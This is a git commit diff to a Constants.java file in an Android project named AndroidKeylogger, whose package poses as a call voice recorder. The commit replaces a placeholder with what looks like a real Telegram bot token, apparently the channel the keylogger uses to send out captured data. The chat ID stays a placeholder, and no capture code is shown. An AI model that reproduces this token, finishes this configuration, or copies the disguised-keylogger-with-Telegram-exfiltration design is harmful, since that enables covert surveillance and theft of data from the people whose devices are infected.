69f7ddcdf067226eaf34bf7bf49c46c6dd69a0b0
Naveen kumar <134396866+N4V33NM@users.noreply.github.com>
2025-02-10 19:54:14 +0530

    Update Constants.java

--- AndroidKeylogger/app/src/main/java/com/example/callvoicerecorder/Constants.java
+++ AndroidKeylogger/app/src/main/java/com/example/callvoicerecorder/Constants.java
@@ -1,6 +1,6 @@
 package com.example.callvoicerecorder;
 
 public class Constants {
-    public static final String TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN";
+    public static final String TELEGRAM_BOT_TOKEN = "8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI";
     public static final String TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";
 }
